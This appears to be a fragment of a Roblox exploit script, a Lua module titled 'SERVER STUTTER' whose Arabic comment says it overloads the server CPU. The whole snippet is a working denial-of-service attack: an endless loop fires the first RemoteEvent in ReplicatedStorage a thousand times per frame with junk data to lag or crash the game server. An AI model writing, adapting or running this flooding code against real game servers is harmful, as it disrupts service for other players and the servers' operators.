-- MODULE 4: SERVER STUTTER (5000 LINES OF SPAM)
while task.wait() do
    for i = 1, 1000 do
        -- إرسال بيانات ثقيلة للسيرفر لإشغال المعالج (CPU Overload)
        game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent"):FireServer("TSAR_BOMBA_DATA")
    end
end

